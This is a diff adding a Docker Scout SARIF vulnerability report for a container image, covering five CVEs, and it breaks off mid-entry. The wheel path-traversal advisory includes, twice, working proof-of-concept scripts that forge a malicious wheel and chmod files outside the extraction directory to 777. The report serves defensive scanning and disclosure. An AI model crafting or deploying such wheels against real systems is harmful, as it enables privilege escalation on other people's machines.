@@ -1,0 +1,1461 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "fullName": "Docker Scout",
+          "informationUri": "https://docker.com/products/docker-scout",
+          "name": "docker scout",
+          "rules": [
+            {
+              "id": "CVE-2026-24049",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-24049: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-24049?s=github&n=wheel&t=pypi&vr=%3E%3D0.40.0%2C%3C%3D0.46.1",
+              "help": {
+                "text": "### Summary\n - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.  \n - **Root Cause Component:** wheel.cli.unpack.unpack function.  \n - **Affected Packages:**  \n   1. wheel (Upstream source)  \n   2. setuptools (Downstream, vendors wheel)  \n - **Severity:** High (Allows modifying system file permissions).  \n\n### Details  \nThe vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.  \n```\n# Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel)\nfor zinfo in wf.filelist:\n    wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile\n\n    # (2) VULNERABILITY:\n    # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.\n    # If zinfo.filename contains \"../\", this targets files outside the destination.\n    permissions = zinfo.external_attr >> 16 & 0o777\n    destination.joinpath(zinfo.filename).chmod(permissions)\n```  \n\n### PoC  \nI have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.  \n\n**Prerequisites:** pip install setuptools  \n\n**Step 1: Generate the Malicious Wheel (gen_poc.py)**  \nThis script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.  \n```\nimport zipfile\nimport hashlib\nimport base64\nimport os\n\ndef urlsafe_b64encode(data):\n    \"\"\"\n    Helper function to encode data using URL-safe Base64 without padding.\n    Required by the Wheel file format specification.\n    \"\"\"\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')\n\ndef get_hash_and_size(data_bytes):\n    \"\"\"\n    Calculates SHA-256 hash and size of the data.\n    These values are required to construct a valid 'RECORD' file,\n    which is used by the 'wheel' library to verify integrity.\n    \"\"\"\n    digest = hashlib.sha256(data_bytes).digest()\n    hash_str = \"sha256=\" + urlsafe_b64encode(digest)\n    return hash_str, str(len(data_bytes))\n\ndef create_evil_wheel_v4(filename=\"evil-1.0-py3-none-any.whl\"):\n    print(f\"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}\")\n\n    # 1. Prepare Standard Metadata Content\n    # These are minimal required contents to make the wheel look legitimate.\n    wheel_content = b\"Wheel-Version: 1.0\\nGenerator: bdist_wheel (0.37.1)\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n\"\n    metadata_content = b\"Metadata-Version: 2.1\\nName: evil\\nVersion: 1.0\\nSummary: PoC Package\\n\"\n   \n    # 2. Define Malicious Payload (Path Traversal)\n    # The content doesn't matter, but the path does.\n    payload_content = b\"PWNED by Path Traversal\"\n\n    # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'\n    # The vulnerability allows 'chmod' to affect this path directly.\n    malicious_path = \"../../poc_target.txt\"\n\n    # 3. Calculate Hashes for Integrity Check Bypass\n    # The 'wheel' library verifies if the file hash matches the RECORD entry.\n    # To bypass this check, we calculate the correct hash for our malicious file.\n    wheel_hash, wheel_size = get_hash_and_size(wheel_content)\n    metadata_hash, metadata_size = get_hash_and_size(metadata_content)\n    payload_hash, payload_size = get_hash_and_size(payload_content)\n\n    # 4. Construct the 'RECORD' File\n    # The RECORD file lists all files in the wheel with their hashes.\n    # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.\n    # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.\n    record_lines = [\n        f\"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}\",\n        f\"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}\",\n        f\"{malicious_path},{payload_hash},{payload_size}\",  # <-- Authenticating the malicious path\n        \"evil-1.0.dist-info/RECORD,,\"\n    ]\n    record_content = \"\\n\".join(record_lines).encode('utf-8')\n\n    # 5. Build the Zip File\n    with zipfile.ZipFile(filename, \"w\") as zf:\n        # Write standard metadata files\n        zf.writestr(\"evil-1.0.dist-info/WHEEL\", wheel_content)\n        zf.writestr(\"evil-1.0.dist-info/METADATA\", metadata_content)\n        zf.writestr(\"evil-1.0.dist-info/RECORD\", record_content)\n\n        # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file\n        # We need to set specific permission bits to trigger the vulnerability.\n        zinfo = zipfile.ZipInfo(malicious_path)\n       \n        # Set external attributes to 0o777 (rwxrwxrwx)\n        # Upper 16 bits: File type (0o100000 = Regular File)\n        # Lower 16 bits: Permissions (0o777 = World Writable)\n        # The vulnerable 'unpack' function will blindly apply this '777' to the system file.\n        zinfo.external_attr = (0o100000 | 0o777) << 16\n       \n        zf.writestr(zinfo, payload_content)\n\n    print(\"[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.\")\n\nif __name__ == \"__main__\":\n    create_evil_wheel_v4()\n```  \n\n**Step 2: Run the Exploit (exploit.py)**  \n```\nfrom pathlib import Path\nimport sys\n\n# Demonstrating impact on setuptools\ntry:\n    from setuptools._vendor.wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from setuptools\")\nexcept ImportError:\n    from wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from wheel\")\n\n# 1. Setup Target (Read-Only system file simulation)\ntarget = Path(\"poc_target.txt\")\ntarget.write_text(\"SENSITIVE CONFIG\")\ntarget.chmod(0o400) # Read-only\nprint(f\"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}\")\n\n# 2. Run Vulnerable Unpack\n# The wheel contains \"../../poc_target.txt\".\n# unpack() will extract safely, BUT chmod() will hit the actual target file.\ntry:\n    unpack(\"evil-1.0-py3-none-any.whl\", \"unpack_dest\")\nexcept Exception as e:\n    print(f\"[!] Ignored expected extraction error: {e}\")\n\n# 3. Check Result\nfinal_perms = oct(target.stat().st_mode)[-3:]\nprint(f\"[*] Final Perms: {final_perms}\")\n\nif final_perms == \"777\":\n    print(\"VULNERABILITY CONFIRMED: Target file is now world-writable (777)!\")\nelse:\n    print(\"[-] Attack failed.\")\n```  \n\n**result:**  \n<img width=\"806\" height=\"838\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db\" />  \n  \n### Impact  \nAttackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.  \n\n### Recommended Fix  \nThe unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().  \n\n### Suggested Patch:  \n```\n# extract() returns the actual path where the file was written\nextracted_path = wf.extract(zinfo, destination)\n\n# Only apply chmod if a file was actually written\nif extracted_path:\n    permissions = zinfo.external_attr >> 16 & 0o777\n    Path(extracted_path).chmod(permissions)\n```\n",
+                "markdown": "> ### Summary\n - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.  \n - **Root Cause Component:** wheel.cli.unpack.unpack function.  \n - **Affected Packages:**  \n   1. wheel (Upstream source)  \n   2. setuptools (Downstream, vendors wheel)  \n - **Severity:** High (Allows modifying system file permissions).  \n\n### Details  \nThe vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.  \n```\n# Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel)\nfor zinfo in wf.filelist:\n    wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile\n\n    # (2) VULNERABILITY:\n    # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.\n    # If zinfo.filename contains \"../\", this targets files outside the destination.\n    permissions = zinfo.external_attr >> 16 & 0o777\n    destination.joinpath(zinfo.filename).chmod(permissions)\n```  \n\n### PoC  \nI have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.  \n\n**Prerequisites:** pip install setuptools  \n\n**Step 1: Generate the Malicious Wheel (gen_poc.py)**  \nThis script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.  \n```\nimport zipfile\nimport hashlib\nimport base64\nimport os\n\ndef urlsafe_b64encode(data):\n    \"\"\"\n    Helper function to encode data using URL-safe Base64 without padding.\n    Required by the Wheel file format specification.\n    \"\"\"\n    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')\n\ndef get_hash_and_size(data_bytes):\n    \"\"\"\n    Calculates SHA-256 hash and size of the data.\n    These values are required to construct a valid 'RECORD' file,\n    which is used by the 'wheel' library to verify integrity.\n    \"\"\"\n    digest = hashlib.sha256(data_bytes).digest()\n    hash_str = \"sha256=\" + urlsafe_b64encode(digest)\n    return hash_str, str(len(data_bytes))\n\ndef create_evil_wheel_v4(filename=\"evil-1.0-py3-none-any.whl\"):\n    print(f\"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}\")\n\n    # 1. Prepare Standard Metadata Content\n    # These are minimal required contents to make the wheel look legitimate.\n    wheel_content = b\"Wheel-Version: 1.0\\nGenerator: bdist_wheel (0.37.1)\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n\"\n    metadata_content = b\"Metadata-Version: 2.1\\nName: evil\\nVersion: 1.0\\nSummary: PoC Package\\n\"\n   \n    # 2. Define Malicious Payload (Path Traversal)\n    # The content doesn't matter, but the path does.\n    payload_content = b\"PWNED by Path Traversal\"\n\n    # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'\n    # The vulnerability allows 'chmod' to affect this path directly.\n    malicious_path = \"../../poc_target.txt\"\n\n    # 3. Calculate Hashes for Integrity Check Bypass\n    # The 'wheel' library verifies if the file hash matches the RECORD entry.\n    # To bypass this check, we calculate the correct hash for our malicious file.\n    wheel_hash, wheel_size = get_hash_and_size(wheel_content)\n    metadata_hash, metadata_size = get_hash_and_size(metadata_content)\n    payload_hash, payload_size = get_hash_and_size(payload_content)\n\n    # 4. Construct the 'RECORD' File\n    # The RECORD file lists all files in the wheel with their hashes.\n    # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.\n    # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.\n    record_lines = [\n        f\"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}\",\n        f\"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}\",\n        f\"{malicious_path},{payload_hash},{payload_size}\",  # <-- Authenticating the malicious path\n        \"evil-1.0.dist-info/RECORD,,\"\n    ]\n    record_content = \"\\n\".join(record_lines).encode('utf-8')\n\n    # 5. Build the Zip File\n    with zipfile.ZipFile(filename, \"w\") as zf:\n        # Write standard metadata files\n        zf.writestr(\"evil-1.0.dist-info/WHEEL\", wheel_content)\n        zf.writestr(\"evil-1.0.dist-info/METADATA\", metadata_content)\n        zf.writestr(\"evil-1.0.dist-info/RECORD\", record_content)\n\n        # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file\n        # We need to set specific permission bits to trigger the vulnerability.\n        zinfo = zipfile.ZipInfo(malicious_path)\n       \n        # Set external attributes to 0o777 (rwxrwxrwx)\n        # Upper 16 bits: File type (0o100000 = Regular File)\n        # Lower 16 bits: Permissions (0o777 = World Writable)\n        # The vulnerable 'unpack' function will blindly apply this '777' to the system file.\n        zinfo.external_attr = (0o100000 | 0o777) << 16\n       \n        zf.writestr(zinfo, payload_content)\n\n    print(\"[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.\")\n\nif __name__ == \"__main__\":\n    create_evil_wheel_v4()\n```  \n\n**Step 2: Run the Exploit (exploit.py)**  \n```\nfrom pathlib import Path\nimport sys\n\n# Demonstrating impact on setuptools\ntry:\n    from setuptools._vendor.wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from setuptools\")\nexcept ImportError:\n    from wheel.cli.unpack import unpack\n    print(\"[*] Loaded unpack from wheel\")\n\n# 1. Setup Target (Read-Only system file simulation)\ntarget = Path(\"poc_target.txt\")\ntarget.write_text(\"SENSITIVE CONFIG\")\ntarget.chmod(0o400) # Read-only\nprint(f\"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}\")\n\n# 2. Run Vulnerable Unpack\n# The wheel contains \"../../poc_target.txt\".\n# unpack() will extract safely, BUT chmod() will hit the actual target file.\ntry:\n    unpack(\"evil-1.0-py3-none-any.whl\", \"unpack_dest\")\nexcept Exception as e:\n    print(f\"[!] Ignored expected extraction error: {e}\")\n\n# 3. Check Result\nfinal_perms = oct(target.stat().st_mode)[-3:]\nprint(f\"[*] Final Perms: {final_perms}\")\n\nif final_perms == \"777\":\n    print(\"VULNERABILITY CONFIRMED: Target file is now world-writable (777)!\")\nelse:\n    print(\"[-] Attack failed.\")\n```  \n\n**result:**  \n<img width=\"806\" height=\"838\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db\" />  \n  \n### Impact  \nAttackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.  \n\n### Recommended Fix  \nThe unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().  \n\n### Suggested Patch:  \n```\n# extract() returns the actual path where the file was written\nextracted_path = wf.extract(zinfo, destination)\n\n# Only apply chmod if a file was actually written\nif extracted_path:\n    permissions = zinfo.external_attr >> 16 & 0o777\n    Path(extracted_path).chmod(permissions)\n```\n\n|                                                                                                      |\n|Package                                                                        pkg:pypi/wheel@0.45.1  |\n|Affected range                                                                 >=0.40.0,<=0.46.1      |\n|Fixed version                                                                  0.46.2                 |\n|[[CVSS Score 7.1] [CVSS Vector CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H]]                         |\n"
+              },
+              "properties": {
+                "affected_version": ">=0.40.0,<=0.46.1",
+                "cvssV3": 7.1,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H",
+                "fixed_version": "0.46.2",
+                "purls": [
+                  "pkg:pypi/wheel@0.45.1"
+                ],
+                "security-severity": "7.1",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-26007",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-26007: Insufficient Verification of Data Authenticity"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-26007?s=github&n=cryptography&t=pypi&vr=%3C%3D46.0.4",
+              "help": {
+                "text": "## Vulnerability Summary\n\nThe `public_key_from_numbers` (or `EllipticCurvePublicNumbers.public_key()`), `EllipticCurvePublicNumbers.public_key()`, `load_der_public_key()` and `load_pem_public_key()` functions do not verify that the point belongs to the expected prime-order subgroup of the curve.\n\nThis missing validation allows an attacker to provide a public key point `P` from a small-order subgroup.  This can lead to security issues in various situations, such as the most commonly used signature verification (ECDSA) and shared key negotiation (ECDH). When the victim computes the shared secret as `S = [victim_private_key]P` via ECDH,  this leaks information about `victim_private_key mod (small_subgroup_order)`. For curves with cofactor > 1, this reveals the least significant bits of the private key.  When these weak public keys are used in ECDSA , it's easy to forge signatures on the small subgroup.\n\nOnly SECT curves are impacted by this.\n\n## Credit\n\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine\n",
+                "markdown": "> ## Vulnerability Summary\n\nThe `public_key_from_numbers` (or `EllipticCurvePublicNumbers.public_key()`), `EllipticCurvePublicNumbers.public_key()`, `load_der_public_key()` and `load_pem_public_key()` functions do not verify that the point belongs to the expected prime-order subgroup of the curve.\n\nThis missing validation allows an attacker to provide a public key point `P` from a small-order subgroup.  This can lead to security issues in various situations, such as the most commonly used signature verification (ECDSA) and shared key negotiation (ECDH). When the victim computes the shared secret as `S = [victim_private_key]P` via ECDH,  this leaks information about `victim_private_key mod (small_subgroup_order)`. For curves with cofactor > 1, this reveals the least significant bits of the private key.  When these weak public keys are used in ECDSA , it's easy to forge signatures on the small subgroup.\n\nOnly SECT curves are impacted by this.\n\n## Credit\n\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine\n\n|                                                                                                                                                                                                                                               |\n|Package                                                                                                                                                                                                          pkg:pypi/cryptography@46.0.3  |\n|Affected range                                                                                                                                                                                                   <=46.0.4                      |\n|Fixed version                                                                                                                                                                                                    46.0.5                        |\n|[[CVSS Score 8.2] [CVSS Vector CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X]]                                |\n"
+              },
+              "properties": {
+                "affected_version": "<=46.0.4",
+                "cvssV3": 8.2,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+                "fixed_version": "46.0.5",
+                "purls": [
+                  "pkg:pypi/cryptography@46.0.3"
+                ],
+                "security-severity": "8.2",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-25646",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-25646"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-25646?s=debian&n=libpng1.6&ns=debian&t=deb&osn=debian&osv=13&vr=%3C1.6.48-1%2Bdeb13u3",
+              "help": {
+                "text": "LIBPNG is a reference library for use in applications that read, create, and manipulate PNG (Portable Network Graphics) raster image files. Prior to 1.6.55, an out-of-bounds read vulnerability exists in the png_set_quantize() API function. When the function is called with no histogram and the number of colors in the palette is more than twice the maximum supported by the user's display, certain palettes will cause the function to enter into an infinite loop that reads past the end of an internal heap-allocated buffer. The images that trigger this vulnerability are valid per the PNG specification. This vulnerability is fixed in 1.6.55.\n\n---\n- libpng1.6 1.6.55-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1127566)\nhttps://github.com/pnggroup/libpng/security/advisories/GHSA-g8hp-mq4h-rqm3\nFixed by: https://github.com/pnggroup/libpng/commit/01d03b8453eb30ade759cd45c707e5a1c7277d88 (v1.6.55)\n",
+                "markdown": "> LIBPNG is a reference library for use in applications that read, create, and manipulate PNG (Portable Network Graphics) raster image files. Prior to 1.6.55, an out-of-bounds read vulnerability exists in the png_set_quantize() API function. When the function is called with no histogram and the number of colors in the palette is more than twice the maximum supported by the user's display, certain palettes will cause the function to enter into an infinite loop that reads past the end of an internal heap-allocated buffer. The images that trigger this vulnerability are valid per the PNG specification. This vulnerability is fixed in 1.6.55.\n\n---\n- libpng1.6 1.6.55-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1127566)\nhttps://github.com/pnggroup/libpng/security/advisories/GHSA-g8hp-mq4h-rqm3\nFixed by: https://github.com/pnggroup/libpng/commit/01d03b8453eb30ade759cd45c707e5a1c7277d88 (v1.6.55)\n\n|                                                                                                           |\n|Package         pkg:deb/debian/libpng1.6@1.6.48-1%2Bdeb13u1?os_distro=trixie&os_name=debian&os_version=13  |\n|Affected range  <1.6.48-1+deb13u3                                                                          |\n|Fixed version   1.6.48-1+deb13u3                                                                           |\n"
+              },
+              "properties": {
+                "affected_version": "<1.6.48-1+deb13u3",
+                "cvssV3_severity": "HIGH",
+                "fixed_version": "1.6.48-1+deb13u3",
+                "purls": [
+                  "pkg:deb/debian/libpng1.6@1.6.48-1%2Bdeb13u1?os_distro=trixie&os_name=debian&os_version=13"
+                ],
+                "security-severity": "8.3",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-21441",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-21441: Improper Handling of Highly Compressed Data (Data Amplification)"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-21441?s=github&n=urllib3&t=pypi&vr=%3E%3D1.22%2C%3C2.6.3",
+              "help": {
+                "text": "### Impact\n\nurllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.\n\nurllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.\n\nHowever, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).\n\n### Affected usages\n\nApplications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.\n\n\n### Remediation\n\nUpgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.\n\nIf upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source.\n",
+                "markdown": "> ### Impact\n\nurllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.\n\nurllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.\n\nHowever, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).\n\n### Affected usages\n\nApplications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.\n\n\n### Remediation\n\nUpgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.\n\nIf upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source.\n\n|                                                                                                                          |\n|Package                                                                                           pkg:pypi/urllib3@2.6.1  |\n|Affected range                                                                                    >=1.22,<2.6.3           |\n|Fixed version                                                                                     2.6.3                   |\n|[[CVSS Score 8.9] [CVSS Vector CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H]]                          |\n"
+              },
+              "properties": {
+                "affected_version": ">=1.22,<2.6.3",
+                "cvssV3": 8.9,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H",
+                "fixed_version": "2.6.3",
+                "purls": [
+                  "pkg:pypi/urllib3@2.6.1"
+                ],
+                "security-severity": "8.9",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-2781",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-2781"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-2781?s=debian&n=nss&ns=debian&t=deb&osn=debian&osv=13&vr=%3C2%3A3.110-1%2Bdeb13u1",
+              "help": {
+                "text": "Integer overflow in the Libraries component in NSS. This vulnerability affects Firefox < 148, Firefox ESR < 140.8, Thunderbird < 148, and Thunderbird < 140.8.\n\n---\n- firefox 148.0-1\n- firefox-esr 140.8.0esr-1\n- thunderbird 1:140.8.0esr-1\n- nss 2:3.121-1\nhttps://www.mozilla.org/en-US/security/advisories/mfsa2026-13/#CVE-2026-2781\nhttps://www.mozilla.org/en-US/security/advisories/mfsa2026-15/#CVE-2026-2781\nhttps://www.mozilla.org/en-US/security/advisories/mfsa2026-17/#CVE-2026-2781\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=2009552 (private)\nFixed by: https://hg.mozilla.org/projects/nss/rev/245385e16fa6\n",
+                "markdown": "> Integer overflow in the Libraries component in NSS. This vulnerability affects Firefox < 148, Firefox ESR < 140.8, Thunderbird < 148, and Thunderbird < 140.8.\n\n---\n- firefox 148.0-1\n- firefox-esr 140.8.0esr-1\n- thunderbird 1:140.8.0esr-1\n- nss 2:3.121-1\nhttps://www.mozilla.org/en-US/security/advisories/mfsa2026-13/#CVE-2026-2781\nhttps://www.mozilla.org/en-US/security/advisories/mfsa2026-15/#CVE-2026-2781\nhttps://www.mozilla.org/en-US/security/advisories/mfsa2026-17/#CVE-2026-2781\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=2009552 (private)\nFixed by: https://hg.mozilla.org/projects/nss/rev/245385e16fa6\n\n|                                                                                              |\n|Package         pkg:deb/debian/nss@2%3A3.110-1?os_distro=trixie&os_name=debian&os_version=13  |\n|Affected range  <2:3.110-1+deb13u1                                                            |\n|Fixed version   2:3.110-1+deb13u1                                                             |\n"
+              },
+              "properties": {
+                "affected_version": "<2:3.110-1+deb13u1",
+                "cvssV3_severity": "CRITICAL",
+                "fixed_version": "2:3.110-1+deb13u1",
+                "purls": [
+                  "pkg:deb/debian/nss@2%3A3.110-1?os_distro=trixie&os_name=debian&os_version=13"
+                ],
+                "security-severity": "9.8",
+                "tags": [
+                  "CRITICAL"
+                ]
+              }
+            }
+          ],
+          "version": "1.20.0"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CVE-2026-24049",
+          "ruleIndex": 0,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2026-24049                                \nSeverity         :HIGH                                          \nPackage          :pkg:pypi/wheel@0.45.1                         \nAffected range   :>=0.40.0,<=0.46.1                             \nFixed version    :0.46.2                                        \nCVSS Score       :7.1                                           \nCVSS Vector      :CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H  \nEPSS Score       :0.000080                                      \nEPSS Percentile  :0.006200                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/opt/conda/lib/python3.13/site-packages/setuptools/_vendor/wheel-0.45.1.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/opt/conda/lib/python3.13/site-packages/setuptools/_vendor/wheel-0.45.1.dist-info/RECORD"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/opt/conda/lib/python3.13/site-packages/wheel-0.45.1.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/opt/conda/lib/python3.13/site-packages/wheel-0.45.1.dist-info/RECORD"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-26007",
+          "ruleIndex": 1,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2026-26007                                                                                                                                                                  \nSeverity         :HIGH                                                                                                                                                                            \nPackage          :pkg:pypi/cryptography@46.0.3                                                                                                                                                    \nAffected range   :<=46.0.4                                                                                                                                                                        \nFixed version    :46.0.5                                                                                                                                                                          \nCVSS Score       :8.2                                                                                                                                                                             \nCVSS Vector      :CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X  \nEPSS Score       :0.000070                                                                                                                                                                        \nEPSS Percentile  :0.004470                                                                                                                                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/opt/conda/lib/python3.13/site-packages/cryptography-46.0.3.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/opt/conda/lib/python3.13/site-packages/cryptography-46.0.3.dist-info/RECORD"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/opt/conda/lib/python3.13/site-packages/cryptography-46.0.3.dist-info/direct_url.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-25646",
+          "ruleIndex": 2,
+          "kind": "fail",
+          "level": "error",
+          "message": {
